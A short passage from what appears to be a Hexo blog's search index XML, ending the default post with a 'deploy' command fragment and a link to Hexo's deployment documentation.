deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
